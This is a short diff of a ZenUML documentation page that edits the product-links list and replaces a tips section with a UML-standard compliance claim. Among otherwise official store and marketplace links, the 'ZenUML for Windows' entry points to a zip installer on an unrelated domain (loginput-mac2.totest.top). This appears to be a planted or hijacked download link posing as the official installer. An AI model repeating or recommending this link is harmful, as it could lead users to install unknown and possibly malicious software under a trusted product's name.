@@ -36,7 +36,7 @@ Goto [ZenUML Online Editor](https://app.zenuml.com) or click the **arrow** on ab
 
 ## Choose our products on different platforms
 
-- [Diagram on Confluence](https://marketplace.atlassian.com/apps/1218380/zenuml-diagrams-for-confluence-freemium?hosting=cloud&tab=overview&src=landing)
+- [Diagram on Confluence](/docs/products/zenuml-diagrams-for-confluence)
 - [Online Editor](https://app.zenuml.com/)
 - [Chrome Extension](https://chrome.google.com/webstore/detail/web-sequence/kcpganeflmhffnlofpdmcjklmdpbbmef)
 - [JetBrains Plugin](https://plugins.jetbrains.com/plugin/12437-zenuml-support)
@@ -44,10 +44,9 @@ Goto [ZenUML Online Editor](https://app.zenuml.com) or click the **arrow** on ab
 - [ZenUML for Mac](https://apps.apple.com/app/zenuml/id1602636196?mt=12)
 - [ZenUML for Windows](https://loginput-mac2.totest.top/ZenUML-Setup.zip)
 
-## Tips
+## Compliant with Standard
 
-- Aim for clarity and simplicity in your DSL scripts to facilitate effortless future edits.
-- Leverage comments and proper formatting within your script to augment legibility.
+We have built-in our 20 years of experience in software development and architecture into ZenUML. The produced diagram is automatically standard compliant with [OMG UML(R) 2.5.1](https://www.omg.org/spec/UML/2.5.1/About-UML).
 
 ## Support and Insights
 
